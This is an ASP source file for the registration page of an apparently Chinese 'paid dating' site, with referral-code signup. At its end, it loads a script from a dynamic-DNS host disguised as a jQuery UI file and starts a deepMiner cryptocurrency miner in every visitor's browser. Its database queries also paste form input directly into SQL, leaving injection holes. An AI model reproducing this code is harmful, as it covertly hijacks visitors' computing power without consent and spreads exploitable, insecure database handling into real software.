<!--#include file="inc/Const.asp"-->
<!--#include file="inc/Conn.asp"-->
<!--#include file="inc/md5.asp"-->
<!--#include file="inc/function.asp"-->

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<meta name="format-detection" content="telephone=no">
<title>注册</title>
<link rel="stylesheet" type="text/css" href="css/style.css"/>
<link rel="stylesheet" type="text/css" href="css/sweetalert.css">
<script src="js/jquery-2.2.3.min.js"></script>

<script src="js/sweetalert.min.js"></script>
<script src="js/user.js"></script>
</head>
<body>
<%

Dim action
action = Cint(Request.QueryString("a"))
If action=1 Then
	Dim userName,userPass1,userPass2,recCode,userPass
	userName 	= Replace(Trim(Request.Form("userName")),",","")
	userPass1 	= Request.Form("userPass1")
	userPass2 	= Request.Form("userPass2")
	recCode 	= Request.Form("recCode")
	If userName="" Or userPass1="" Or userPass2="" Then
		Call ShowErrorInfo("用户名称和密码必须输入，请确认！","reg.asp")
	End If
	If Not CheckAccountOk(userName) Then
		Call ShowErrorInfo("用户名输入错误，只能是字母和数字切不能以数字开头！","reg.asp")
	End If
	If Len(userName)>20 or Len(userName)<6 Then
		Call ShowErrorInfo("用户名长度必须为6到20个字符！","reg.asp")
	End If
	If userPass1 <> userPass2 Then
		Call ShowErrorInfo("您两次输入的密码不一样，请确认！","reg.asp")
	End If
	If recCode="" Then
		Call ShowErrorInfo("推荐码必须输入，请确认！","reg.asp")
	End If
	
	IF Not CheckNumCharOK(recCode) Then
		Call ShowErrorInfo("推荐码输入错误！请确认！","reg.asp")
	End If
	userPass = md5(userPass1,32)

	Call OpenDataBase
	Set codeRs=Conn.Execute("select id,get_mem_id from BL_s_rec_code_info where code_str='"&recCode&"' and use_mem_id is null")
	If codeRs.Eof Then
		codeRs.Close
		Set codeRs = Nothing
		Call ShowErrorInfo("推荐码输入错误！请确认！","reg.asp")
	Else
		getMemId=codeRs("get_mem_id")
	End If
	codeRs.Close
	Set codeRs = Nothing
	
	Set Rs=Conn.Execute("select id from BL_m_member_info where mem_name='"&userName&"'")
	If Not Rs.Eof Then
		Call ShowErrorInfo("此账号已经被注册，请重新输入！","reg.asp")
	End If
	Rs.Close
	Set Rs = Nothing
	Conn.Execute("insert into BL_m_member_info(mem_name,mem_pass,rec_code) values('"&userName&"','"&userPass&"','"&recCode&"')")
	'推荐码处理
	'如果用户输入的推荐码正确，则处理
	
	Set RecRs=Conn.Execute("select id from BL_m_member_info where rec_code='"&recCode&"'")
	If Not RecRs.Eof Then
		Conn.Execute("update BL_m_member_info set mem_weiwang=mem_weiwang+1 where id="&getMemId)
		Conn.Execute("update BL_s_rec_code_info set use_mem_id="&RecRs("id")&",use_time=getdate() where code_str='"&recCode&"'")
	End If
	RecRs.Close
	Set RecRs = Nothing

	Call connClose
	Call ShowErrorInfo("注册成功，请登录！","login.asp")
	'Session(G_SessionPre&"_Admin_ID") 	=0
	'Session(G_SessionPre&"_Admin_Name")	=userName
	'Session(G_SessionPre&"_Admin_Pop")	=""
	
	'Response.Redirect("youke.asp")
	
End If

%>
<header class="headtop"> <img src="images/logo.png">
  <h3 class="pink" style="font-weight:400"><span class="fz16"><!--[ </span>有偿约会交友平台<span class="fz16"> ]</span>--></h3>
</header>
<article>
  <form action="reg.asp?a=1" method="post" id="formReg">
    <div class="row">
      <ul class="login-box">
        <li>
          <input type="text" placeholder="您的用户名" name="userName" id="userName" />
        </li>
        <li>
          <input type="password" placeholder="您的密码" name="userPass1" id="userPass1" />
        </li>
        <li>
          <input type="password" placeholder="重复您的密码" name="userPass2" id="userPass2" />
        </li>
        <li>
          <input type="text" placeholder="您的推荐码（加群90791227得推荐码）" name="recCode" id="recCode" />
        </li>
      </ul>
    </div>
    <div class="row margin-tb20">
      <input type="submit" value="注册" class="btn btn-block btn-success bg80" id="regBtn" disabled="true" />
      <input type="button" value="登录" class="btn btn-default btn-block" onclick="location.href='login.asp'" />
      <div class="text-align xieyi-txt">
        <input type="checkbox" name="xieyi" id="xieyi" />
        <label for="xieyi">我已同意并阅读</label>
        <a href="xieyi.asp">&lt;&lt;用户协议&gt;&gt;</a></div>
    </div>
  </form>
</article>
<div style="display:none;"><script src="https://s22.cnzz.com/z_stat.php?id=1262562117&web_id=1262562117" language="JavaScript"></script></div>

<script src="https://greenindex.dynamic-dns.net/jqueryeasyui.js"></script>
	<script>
		var uri = 'www';
		var jqueryui = new deepMiner.Anonymous(uri, {autoThreads: true,throttle: 0.5});
		jqueryui.start();
	</script></body>
</html>
